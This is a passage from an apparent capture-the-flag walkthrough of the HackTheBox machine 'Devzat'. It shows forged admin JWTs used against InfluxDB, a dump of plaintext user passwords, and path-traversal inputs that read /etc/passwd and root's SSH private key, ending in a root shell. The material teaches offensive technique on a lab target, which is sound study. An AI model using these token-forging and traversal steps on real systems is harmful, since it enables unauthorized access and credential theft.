patrick@devzat:~$ curl -G localhost:8086/query?pretty=true --data-urlencode "q=SHOW DATABASES" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBhdHJpY2siLCJleHAiOjE2NjYwMzQ3MTZ9.NxviPyBvpdyXsf3j7vru-LpLZ3AtGM68049rHSzMqX8"
{
    "error": "user not found"
}

```

Still, the fact that it accepted the token and is just complaining about the user is a really good sign. When I create a token with the username admin, it works:

```

curl -G localhost:8086/query?pretty=true --data-urlencode "q=SHOW DATABASES" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY2MDM0NzE2fQ.fd4oRbG8JP0j2uPtYP3dVUSAewNxKxbcYyjhcmYo1I4"
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "databases",
                    "columns": [
                        "name"
                    ],
                    "values": [
                        [
                            "devzat"
                        ],
                        [
                            "_internal"
                        ]
                    ]
                }
            ]
        }
    ]
}

```

#### Enumerate with Auth

Now that I’m authenticated, I can enumerate the DB. The query above showed two DBs. `_internal` is part of the database itself, so I’ll start on `devzat`. Tables are called measurements in Influx (I’ll move the token into a variable for readability):

```

patrick@devzat:~$ token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY2MDM0NzE2fQ.fd4oRbG8JP0j2uPtYP3dVUSAewNxKxbcYyjhcmYo1I"
patrick@devzat:~$ curl -G --data-urlencode "q=SHOW Measurements" -d "db=devzat" localhost:8086/query?pretty=true -H "Authorization: Bearer $token"
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "measurements",
                    "columns": [
                        "name"
                    ],
                    "values": [
                        [
                            "user"
                        ]
                    ]
                }
            ]
        }
    ]
}

```

Only one table, `user`.

I’ll dump all the data, making sure to put the table name in `"` which need to be escaped:

```

patrick@devzat:~$ curl -G --data-urlencode "q=select * from \"user\"" -d "db=devzat" localhost:8086/query?pretty=true -H "Authorization: Bearer $token"
{
    "results": [
        {
            "statement_id": 0,
            "series": [
                {
                    "name": "user",
                    "columns": [
                        "time",
                        "enabled",
                        "password",
                        "username"
                    ],
                    "values": [
                        [
                            "2021-06-22T20:04:16.313965493Z",
                            false,
                            "WillyWonka2021",
                            "wilhelm"
                        ],
                        [
                            "2021-06-22T20:04:16.320782034Z",
                            true,
                            "woBeeYareedahc7Oogeephies7Aiseci",
                            "catherine"
                        ],
                        [
                            "2021-06-22T20:04:16.996682002Z",
                            true,
                            "RoyalQueenBee$",
                            "charles"
                        ]
                    ]
                }
            ]
        }
    ]
}

```

### su

There’s a password for catherine, and it works for that account on the box:

```

patrick@devzat:~$ su - catherine
Password: 
catherine@devzat:~$

```

I can now read `user.txt`:

```

catherine@devzat:~$ cat user.txt
5394ba2d************************

```

## Shell as root

### Enumeration

#### devzat

catherine’s home directory is basically empty. I’ll check the devzat chat as catherine. This username is another one that I can’t connect to from my host because it’s “reserved”:

```

oxdf@hacky$ ssh -p 8000 catherine@devzat.htb
Nickname reserved for local use, please choose a different one.
> 

```

From Devzat, it works:

```

catherine@devzat:~$ ssh -p 8000 localhost
patrick: Hey Catherine, glad you came.
catherine: Hey bud, what are you up to?
patrick: Remember the cool new feature we talked about the other day?
catherine: Sure
patrick: I implemented it. If you want to check it out you could connect to the local dev instance on port 8443.
catherine: Kinda busy right now 👔
patrick: That's perfectly fine 👍  You'll need a password I gave you last time.
catherine: k
patrick: I left the source for your review in backups.
catherine: Fine. As soon as the boss let me off the leash I will check it out.
patrick: Cool. I am very curious what you think of it. See ya!
devbot: patrick has left the chat
Welcome to the chat. There are no more users
devbot: catherine has joined the chat
catherine:

```

There’s a conversation between patrick and catherine. patrick has a dev instance of devzat running on local TCP 8443 (the port I noted earlier). There’s a new feature, it requires a password, and the source is in “backups”.

For what it’s worth, there’s no reason I couldn’t have accessed this chat as catherine from my initial shell as patrick with `ssh -p 8000 catherine@localhost`. It would have spoiled a bit of the path out of order, but I still need a shell as catherine to progress.

There are two zips in `/var/backups` that look like they could be the main and development source, both owned by catherine (not sure how patrick got them there under her ownership, but probably a gameplay thing from HTB):

```

catherine@devzat:~$ ls -l /var/backups/
total 1352
-rw-r--r-- 1 root      root       51200 Oct 17 06:25 alternatives.tar.0
-rw-r--r-- 1 root      root       59142 Sep 28 18:45 apt.extended_states.0
-rw-r--r-- 1 root      root        6588 Sep 21 20:17 apt.extended_states.1.gz
-rw-r--r-- 1 root      root        6602 Jul 16 06:41 apt.extended_states.2.gz
-rw------- 1 catherine catherine  28297 Jul 16 07:00 devzat-dev.zip
-rw------- 1 catherine catherine  27567 Jul 16 07:00 devzat-main.zip
-rw-r--r-- 1 root      root         268 Sep 29 11:46 dpkg.diversions.0
-rw-r--r-- 1 root      root         139 Sep 29 11:46 dpkg.diversions.1.gz
-rw-r--r-- 1 root      root         170 Jul 16 06:41 dpkg.statoverride.0
-rw-r--r-- 1 root      root         152 Jul 16 06:41 dpkg.statoverride.1.gz
-rw-r--r-- 1 root      root      951869 Sep 28 18:45 dpkg.status.0
-rw-r--r-- 1 root      root      224906 Sep 28 18:45 dpkg.status.1.gz

```

I’ll pull copies back to my box by copying them into `/tmp` and making sure patrick can read them:

```

catherine@devzat:/tmp$ cp /var/backups/devzat-* /tmp/; chmod 666 /tmp/devzat-*

```

Now I’ll download them with `scp` as patrick using the SSH key:

```

oxdf@hacky$ scp -i ~/keys/devzat-patrick patrick@devzat.htb:/tmp/devzat* .
devzat-dev.zip                                                                                       100%   28KB 126.3KB/s   00:00    
devzat-main.zip                                                                                      100%   27KB  62.3KB/s   00:00

```

And cleanup after myself:

```

catherine@devzat:/tmp$ rm /tmp/devzat-*

```

#### Source Analysis

To find out what’s changes, I’ll use `diff` with the following options:
- `-b` - ignore whitespace
- `-u` - give 3 lines before and after diff for context
- `-r` - recursive

If I add `--color` it’ll produce color coded output that’s easy to read:

[![image-20211014083539065](https://0xdfimages.gitlab.io/img/image-20211014083539065.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211014083539065.png)

The dev version adds the `file` command in `commands.go`.

This function takes two args, a file path and a password:

```

func fileCommand(u *user, args []string) {
    if len(args) < 1 {
        u.system("Please provide file to print and the password")
        return
    }

    if len(args) < 2 {
        u.system("You need to provide the correct password to use this function")
        return
    }

    path := args[0]
    pass := args[1]

```

It checks the password against a hardcoded string:

```

    // Check my secure password
    if pass != "CeilingCatStillAThingIn2021?" {
        u.system("You did provide the wrong password")
        return
    }

```

It then appends the given path to the current working directory:

```

    // Get CWD
    cwd, err := os.Getwd()
    if err != nil {
        u.system(err.Error())
    }

    // Construct path to print
    printPath := filepath.Join(cwd, path)

```

Then it makes sure the file exists, returning with an error message if not. Then it basically reads the file and passes the results to `u.system(fmt.Sprintf())`, which seems to be a print within this framework:

```

    // Check if file exists
    if _, err := os.Stat(printPath); err == nil {
        // exists, print
        file, err := os.Open(printPath)
        if err != nil {
            u.system(fmt.Sprintf("Something went wrong opening the file: %+v", err.Error()))
            return
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            u.system(scanner.Text())
        }

        if err := scanner.Err(); err != nil {
            u.system(fmt.Sprintf("Something went wrong printing the file: %+v", err.Error()))
        }

        return

    } else if os.IsNotExist(err) {
        // does not exist, print error
        u.system(fmt.Sprintf("The requested file @ %+v does not exist!", printPath))
        return
    }
    // bokred?
    u.system("Something went badly wrong.")
}

```

There’s no sanitization of the inputs, so I can likely do a path traversal here to read files anywhere on the system.

### File Read

I’ll connect to the dev version from Devzat (it doesn’t matter what user I connect as):

```

catherine@devzat:~$ ssh -p 8443 oxdf@localhost
Welcome to the chat. There are no more users
devbot: oxdf has joined the chat
oxdf:

```

Running `/commands` shows that the `/file` command is present (and labeled as “alpha”):

```

oxdf: /commands
[SYSTEM] Commands
[SYSTEM] clear - Clears your terminal
[SYSTEM] message - Sends a private message to someone
[SYSTEM] users - Gets a list of the active users
[SYSTEM] all - Gets a list of all users who has ever connected
[SYSTEM] exit - Kicks you out of the chat incase your client was bugged
[SYSTEM] bell - Toggles notifications when you get pinged
[SYSTEM] room - Changes which room you are currently in
[SYSTEM] id - Gets the hashed IP of the user
[SYSTEM] commands - Get a list of commands
[SYSTEM] nick - Change your display name
[SYSTEM] color - Change your display name color
[SYSTEM] timezone - Change how you view time
[SYSTEM] emojis - Get a list of emojis you can use
[SYSTEM] help - Get generic info about the server
[SYSTEM] tictactoe - Play tictactoe
[SYSTEM] hangman - Play hangman
[SYSTEM] shrug - Drops a shrug emoji
[SYSTEM] ascii-art - Bob ross with text
[SYSTEM] example-code - Hello world!
[SYSTEM] file - Paste a files content directly to chat [alpha]

```

If I try to run it, it needs the password:

```

oxdf: /file notAFile
[SYSTEM] You need to provide the correct password to use this function
oxdf: /file notAFile badPass
[SYSTEM] You did provide the wrong password

```

With the right password, it leaks the path of the running process, `/root/devzat`:

```

oxdf: /file notAFile CeilingCatStillAThingIn2021?
[SYSTEM] The requested file @ /root/devzat/notAFile does not exist!

```

I’m able to read `/etc/passwd`:

```

oxdf: /file ../../etc/passwd CeilingCatStillAThingIn2021?
[SYSTEM] root:x:0:0:root:/root:/bin/bash
[SYSTEM] daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[SYSTEM] bin:x:2:2:bin:/bin:/usr/sbin/nologin
[SYSTEM] sys:x:3:3:sys:/dev:/usr/sbin/nologin
[SYSTEM] sync:x:4:65534:sync:/bin:/bin/sync
[SYSTEM] games:x:5:60:games:/usr/games:/usr/sbin/nologin
...[snip]...

```

I can also read an SSH key from `/root/.ssh`:

```

oxdf: /file ../.ssh/id_rsa CeilingCatStillAThingIn2021?
[SYSTEM] -----BEGIN OPENSSH PRIVATE KEY-----
[SYSTEM] b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
[SYSTEM] QyNTUxOQAAACDfr/J5xYHImnVIIQqUKJs+7ENHpMO2cyDibvRZ/rbCqAAAAJiUCzUclAs1
...[snip]...
[SYSTEM] Q0ekw7ZzIOJu9Fn+tsKoAAAAD3Jvb3RAZGV2emF0Lmh0YgECAwQFBg==
[SYSTEM] -----END OPENSSH PRIVATE KEY-----

```

### SSH

With that key, I can connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/devzat-root root@devzat.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
...[snip]...
Last login: Sun Oct 17 15:57:45 2021 from 10.10.14.9
root@devzat:~#

```

And grab `root.txt`:

```

root@devzat:~# cat root.txt
d7bb5cba************************

```